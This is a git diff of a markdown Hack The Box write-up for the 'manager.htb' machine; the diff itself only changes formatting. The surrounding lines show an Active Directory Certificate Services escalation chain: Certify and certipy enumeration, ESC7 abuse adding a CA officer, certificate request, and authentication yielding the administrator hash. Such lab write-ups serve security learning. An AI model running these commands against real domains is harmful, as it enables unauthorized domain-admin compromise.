@@ -74,8 +74,7 @@ upload cerfity.exe
 ./Certify.exe find /vulnerable
 ```
 <br/><br/>
-> Now we’re gonna use certipy, with an auth we get  specific vulnerabilities and exploit them
-> 
+Now we’re gonna use certipy, with an auth we get  specific vulnerabilities and exploit them
 <br/><br/>
 ```bash
 certipy find -u user@--- -p "rtgre" -enable -vulnearable -target manager.htb
@@ -83,6 +82,7 @@ certipy find -u user@--- -p "rtgre" -enable -vulnearable -target manager.htb
 <br/><br/>
 Vulnerable to ESC7 find mor info [HERE](https://github.com/ly4k/Certipy#esc7) and exploit
 <br/><br/>
+
 ```bash
 #Add an officer named 'raven' to the CA named 'manager-DC01-CA' given managecertificate rights
 certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password '<password>' 
@@ -103,6 +103,7 @@ certipy req -username 'raven@manager.htb' -password '<password>' -ca "manager-DC
 <br/><br/>
 You’ve got a hash for admin with
 <br/><br/>
+
 ```bash
 certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236
 ```
